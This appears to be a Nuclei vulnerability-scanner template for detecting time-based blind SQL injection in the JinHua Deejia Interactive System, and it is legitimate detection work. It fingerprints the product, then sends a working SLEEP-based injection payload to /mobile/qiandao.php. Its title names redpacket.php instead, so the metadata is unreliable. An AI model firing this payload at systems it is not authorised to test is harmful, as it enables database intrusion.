id: poc-yaml-deejia-redpacket-php-sqli
info:
  name: JinHua Deejia Interactive System redpacket.php SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    Detects SQL Injection vulnerability in JinHua Deejia Interactive System through the redpacket.php endpoint.

variables:
  t1: "{{rand_int(2,5)}}"
  t2: "{{to_number(t1) + to_number(t1)}}"
  t3: "{{to_number(t2) + 2}}"

http:
  - raw:
      - |
        GET /frame.php HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "/wall/themes/meepo/assets/images/defaultbg.jpg"
      - type: word
        part: body
        words:
          - "现场活动大屏幕系统"

  - raw:
      - |
        GET /mobile/qiandao.php?rentopenid=1%22%20AND%20(SELECT%203710%20FROM%20(SELECT(SLEEP({{t1}})))eMwG)--%20yTBg HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "恭喜你签到成功"
      - type: dsl
        dsl:
          - "duration > t2"
          - "duration < t3"
